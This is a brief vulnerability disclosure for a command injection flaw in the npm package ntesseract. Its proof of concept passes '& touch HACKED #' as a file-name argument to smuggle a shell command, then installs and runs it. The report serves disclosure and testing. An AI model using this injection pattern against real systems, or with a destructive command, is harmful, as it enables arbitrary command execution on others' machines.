# Description

Command Injection in ntesseract

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var ntesseract =require("ntesseract");
ntesseract.process("& touch HACKED #","",function(){});
```

2. Execute the following commands in terminal:

```
npm i ntesseract # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution.
